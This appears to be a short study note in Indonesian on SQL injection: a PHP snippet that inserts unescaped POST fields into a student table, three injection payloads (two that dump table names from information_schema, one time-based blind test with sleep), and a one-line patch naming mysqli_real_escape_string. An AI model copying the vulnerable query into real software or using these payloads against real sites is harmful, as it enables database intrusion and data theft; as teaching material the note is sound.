<?php

VULN
$nama = $_POST["nama"];
$npm = $_POST["npm"];
$jurusan = $_POST["jurusan"];
mysqli_query($conn, "INSERT INTO mahasiswa(nama,npm,jurusan) values('$nama', '$npm', '$jurusan')");

EXPLOIT
1. kolom tengah
nama', (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = database()), 'xxx') --
2. kolom terakhir
jurusan'), (NULL, NULL, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = database()) --
3. Blind
jurusan'), (NULL, NULL, (IF(database() = 'mahasiswa', sleep(5),0))) --

PATCH

1. mysqli_real_escape_string();
